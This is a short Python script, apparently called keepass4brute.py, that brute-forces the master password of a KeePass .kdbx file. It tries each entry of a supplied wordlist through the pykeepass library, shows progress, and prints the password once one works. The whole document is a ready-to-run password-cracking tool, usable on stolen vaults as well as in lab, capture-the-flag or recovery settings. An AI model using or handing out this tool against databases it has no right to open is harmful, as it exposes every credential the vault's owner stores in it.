import sys
from pykeepass import PyKeePass
from pykeepass.exceptions import CredentialsError

def try_passwords(kdbx_path, wordlist_path):
    with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
        passwords = f.readlines()

    for i, password in enumerate(passwords):
        password = password.strip()
        try:
            PyKeePass(kdbx_path, password=password)
            print(f"[+] SUCCESS! Password found: {password}")
            return
        except CredentialsError:
            if i % 100 == 0:
                print(f"[-] Tried {i} passwords...", end='\r')
    print("[-] Password not found in wordlist.")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 keepass4brute.py <.kdbx file> <wordlist>")
        sys.exit(1)
    try_passwords(sys.argv[1], sys.argv[2])
